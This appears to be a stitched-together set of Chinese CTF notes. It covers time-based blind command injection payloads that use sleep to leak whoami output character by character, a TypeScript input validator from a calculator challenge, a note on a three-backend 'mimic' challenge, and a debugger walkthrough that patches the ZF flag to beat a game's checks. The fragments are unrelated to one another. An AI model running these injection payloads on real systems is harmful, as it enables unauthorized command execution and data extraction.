Time_Based_RCE

类似于SQL注入的时间盲注，命令执行成功则延时几秒。

空格一定不要少

cmd=if [ 1 = 1 ];then sleep 10;fi#延时10s
cmd=if [ 2 = 1 ];then sleep 10;fi#秒响应

那么我们可以利用这种类似sql盲注的方法进行RCE执行结果获取

cmd=if [ $(whoami | cut -c 1) = w ];then sleep 10;fi

如果成立，则会类似盲注一样，待响应10s，我们就可以通过这种方式进行数据获取

如果其中含有特殊字符，我们可以经过base32处理一下

cmd = if [ $(whoami | base32 | cut -c 1) = N ];then sleep 10;fi

直接执行

cmd = if [ $(whoami) = www-data ];then sleep 10;fi

import {registerDecorator, ValidationOptions, ValidationArguments} from 'class-validator';
import CalculateModel from './calculate.model';

export function ExpressionValidator(property: number, validationOptions?: ValidationOptions) {
   return (object: Object, propertyName: string) => {
        registerDecorator({
            name: 'ExpressionValidator',
            target: object.constructor,
            propertyName,
            constraints: [property],
            options: validationOptions,
            validator: {
                validate(value: any, args: ValidationArguments) {
                  const str = value ? value.toString() : '';
                  if (str.length === 0) {
                    return false;
                  }
                  if (!(args.object as CalculateModel).isVip) {
                    if (str.length >= args.constraints[0]) {
                      return false;
                    }
                  }
                  if (!/^[0-9a-z\[\]\(\)\+\-\*\/ \t]+$/i.test(str)) {
                    return false;
                  }
                  return true;
                },
            },
        });
   };
}

拟态思想，三个后端

这道题使用了拟态的构想，使用了三种后端：nodejs、php、python。我们输入的内容会分别进入3种后端进行执行，如果3种后端返回值一致，才会认定为安全，则将执行结果返回，但是我们没有办法让结果返回值一样。

记一次令人崩溃的动调初探

前言

一直不太会动调，寻思着整个游戏题练练动调。这次经历还是耐人寻味的，尝试了无数遍吧，最后才调好了。

分析

题目很简单，就是个游戏，打通了就给flag，如果单纯的打游戏的话我花了大概5分钟的时间通关了，但是还没来得及截图，画面就没了，可以说是一闪而过。没有走马观碑的本事，那就去老老实实动调去。

就是一个遇到s就按空格，遇到x就按x，遇到m就按m的游戏，考验反应能力emmmmmm，，，

话不多说我们的思路就是通过动调来使游戏通过关，从而拿到flag。

动调

载入之后我们啥也看不懂emmmmmm，，，就先f8跟着走一下

运行到00551ede位置的时候我们就看到程序已经开始运行起来，报错了之后才去执行下一条指令，那我们就记下这个位置，shift+f7跟进去看一下。

跟进去发现应该是要打印前面的那一堆东西了，我们在这f8进行执行。

当我们执行到00551695的时候，此时程序已经开始了输入，并且报错

我们就继续重新载入，在这个地方shift+f7跟进去看看

继续在次f8继续执行。

执行到这里的时候

程序也可以报错，说明程序的校验机制需要我们继续跟进

看样子，这是游戏解释的模块，老规矩f8继续执行

执行到这个位置的时候，我们又遇到了相同的报错，说明校验机制还在套娃呜呜呜，继续f7跟进

之后我们遇到了输入点，当经过判断的时候我们将zf寄存器改为0即可，这样就可以绕过检测

这里就是我们要输入的地方了，这时候我们就可以在输入框里输入空格，来通过检测，然后继续走就是输入x和m，就按照这样的作法一步一步来。

这是我们在调试中找到的判断点，如果输入正确就跳转执行下一个，如果不正确就跳转执行报错。
